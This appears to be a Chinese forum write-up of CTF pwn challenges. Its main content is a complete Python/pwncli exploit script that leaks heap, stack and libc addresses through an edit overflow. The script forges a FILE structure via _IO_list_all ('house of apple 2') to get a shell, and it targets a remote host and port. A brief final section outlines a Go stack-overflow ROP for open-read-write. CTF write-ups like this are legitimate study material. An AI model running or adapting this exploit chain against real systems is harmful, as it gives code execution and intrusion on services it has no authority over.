
```python
def recv_data():
    ru(b'Content: ')
    data = ru(b'\n').decode()
    match = re.search(r'\[(.*?)\]', data)
    content = match.group(1)
    # 将提取的内容转换为列表
    content_list = list(map(int, content.split(',')))
    # print(content_list)
    bytes_string = bytes(content_list)
    print(bytes_string)
    return bytes_string
```

让gpt搓个小脚本，把输出的数据转成 `bytes`

![](https://attach.52pojie.cn/forum/202411/13/175750fvw4af4wla4gsszs.png)

`image-20241112104056594.png` (30.46 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjczNTY0N3wxNDZmMTVlYXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY0N3wxNDZmMTVlYXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

![](https://attach.52pojie.cn/forum/202411/13/175749bn0m7i4nhg3hn30i.png)

`image-20241112103727979.png` (50.41 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTY0NnxhZTc5Y2NhNnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY0NnxhZTc5Y2NhNnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

从里面拿到有用的地址信息

（其实可以发现，他分配的“堆”都是栈上的，相同的地址）

## 3> Hack

在 `edit` 功能中，存在溢出

![](https://attach.52pojie.cn/forum/202411/13/175755lllt0lyycbb0lt1r.png)

`image-20241112104244844.png` (53.09 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTY0OXwzNjY3ZWFiNXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY0OXwzNjY3ZWFiNXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

动调发现，程序在函数结尾会析构一个局部变量（就当它是 `string` 吧）

![](https://attach.52pojie.cn/forum/202411/13/175757ui434l08f58b3d30.png)

`image-20241112104325240.png` (5.53 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTY1MHw5MTkyMjA2MnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY1MHw5MTkyMjA2MnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

![](https://attach.52pojie.cn/forum/202411/13/175759j93omd0927bdo2dj.png)

`image-20241112104531815.png` (12.65 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTY1MXxlNWVjZGFmYnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY1MXxlNWVjZGFmYnwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

溢出可以修改 `v90` 的地址，以达到 `free` 的效果

在这，我选择 `free` 掉管理“堆”的堆（`vec`）

![](https://attach.52pojie.cn/forum/202411/13/175801owljipzm54rpeubw.png)

`image-20241112104704324.png` (114.59 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjczNTY1Mnw3MjkwMTdiZXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY1Mnw3MjkwMTdiZXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:58 上传

![](https://attach.52pojie.cn/forum/202411/13/175803w331k1koy7no8dd6.png)

`image-20241112104710641.png` (19.09 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTY1M3wxYWRmNjUxMXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTY1M3wxYWRmNjUxMXwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:58 上传

`free` 后发现，堆管理的第一个（`index=0`）指向的是自身的上方

![](https://attach.52pojie.cn/forum/202411/13/175731jz4d8szs742xyose.png)

`image-20241112105538099.png` (84.13 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjczNTYzOHwwMTQ1NGJhMHwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNTYzOHwwMTQ1NGJhMHwxNzkzNTcxNjY0fDE2ODA4NnwxOTgxMzc1&nothumb=yes)

2024-11-13 17:57 上传

相当于可以改写自身，同时 `show` 也可以泄露出 `libc` 地址

这里我选择修改 `_IO_list_all`，打 house of apple 2

因为 `edit` 的长度比较短，简单风水一下，多次 `edit` 即可

需要注意的是，题目说远程环境有点小变化，需要自己搭个 `docker`，修改一下偏移

`exp`：

```python
#!/usr/bin/env python3

from pwncli import *
import re

context.terminal = ["tmux", "splitw", "-h", "-l", "150"]

local_flag = sys.argv[1] if len(sys.argv) == 2 else 0

if local_flag == "remote":
    addr = '47.94.231.2 20511'
    # addr = '127.0.0.1 6666'
    host = addr.split(' ')
    gift.io = remote(host[0], host[1])
    gift.remote = True
else:
    gift.io = process('./pwn')
    if local_flag == "nodbg":
        gift.remote = True

init_x64_context(gift.io, gift)
libc = load_libc('./libc.so.6')
gift.elf = ELF('./pwn')

cmd = '''
    directory /mnt/f/Documents/CTF/glibc/glibc-2.39
    b *$rebase(0x1A90F)
    b *$rebase(0x1A022)
    b *$rebase(0x1A2E4)
    b *$rebase(0x1A4C4)
    b *$rebase(0x1A968)
    b *$rebase(0x1A3E4)
    b _IO_wfile_overflow
    c
'''

'''
    b *$rebase(0x19D03)
'''

input_after_this = b'Choice >'

def add():
    sla(input_after_this, b'1')

def dele(idx):
    sla(input_after_this, b'4')
    sla(b'Index', str(idx))

def edit(idx, data):
    sla(input_after_this, b'3')
    sla(b'Index', str(idx))
    sla(b'Content', data)
    return recv_data()

def show(idx):
    sla(input_after_this, b'2')
    sla(b'Index', str(idx))
    return recv_data()

def recv_data():
    ru(b'Content: ')
    data = ru(b'\n').decode()
    match = re.search(r'\[(.*?)\]', data)
    content = match.group(1)
    # 将提取的内容转换为列表
    content_list = list(map(int, content.split(',')))
    # print(content_list)
    bytes_string = bytes(content_list)
    print(bytes_string)
    return bytes_string

add()
leak1 = show(0)
# log_ex(leak1[0x28:0x30])

heap_base = u64_ex(leak1[0x8:0x10]) - 0x2960 - 0x250
# heap_base = u64_ex(leak1[0x8:0x10]) - 0x2BB0
stack = u64_ex(leak1[leak1.find(b'\x7f') - 5 : leak1.find(b'\x7f') + 1]) - 0x178
code_base = u64_ex(leak1[0x28:0x30]) - 0x635B0

log_address_ex2(stack)
log_heap_base_addr(heap_base)
set_current_code_base_and_log(code_base)

for i in range(0x80):
    add()

edit(0, b'a' * 0x20 + p64_ex(heap_base + 0x2BD0))
leak2 = show(1)
libc_base = u64_ex(leak2[leak2.find(b'\x7f') - 5 : leak2.find(b'\x7f') + 1]) - 0x203B30
set_current_libc_base_and_log(libc_base)

launch_gdb(cmd)

edit(
    2, p64_ex(0) + p64_ex(0x21) + p64_ex(libc.sym._IO_list_all) + p64_ex(heap_base + 0x2F00) + p64_ex(heap_base + 0x2BF0) + p64_ex(heap_base + 0x2F00)
)
edit(0, p64_ex(heap_base + 0x2F00))
edit(2, p64_ex(heap_base + 0x2F50) + p64_ex(heap_base + 0x2FA0) + p64_ex(heap_base + 0x90 + 0x250) + p64_ex(heap_base + 0x2FF0))

fake_IO_FILE = heap_base + 0x2F00
_IO_wfile_jumps = libc.sym._IO_wfile_jumps
payload1 = flat(
    {
        0x0: u64_ex("  sh"),
        0x28: 0xB81,
        0x118: fake_IO_FILE + 0x80 - 0x68,
        0x80: libc.sym.system,
        0x88: heap_base + 0x250,
        0xA0: fake_IO_FILE + 0x118 - 0xE0,
        0xD8: _IO_wfile_jumps,
    },
    filler=b'\x00',
)
log_ex(hex(len(payload1)))

edit(3, payload1[:0x4F])
edit(4, payload1[0x50:0x9F])
edit(5, payload1[0xA0:0xEF])
edit(7, payload1[0xF0:0x13F])

log_address_ex2(stack)
pause()
edit(6, p64_ex(0))
sla(input_after_this, b'5')
ia()
```

## 2> Qroute

一个使用 `go` 编写的程序，漏洞点出在解析 `ping ip` 的时候，程序没有判断两个 `.` 之间的字符串长度，因此发生了栈溢出

但是 `go` 的 ROP 较为困难，需要恢复栈上很多地址，才能使程序不报错

ROP 实现 orw 即可

图片好像有点小问题（第一次发帖不太会用
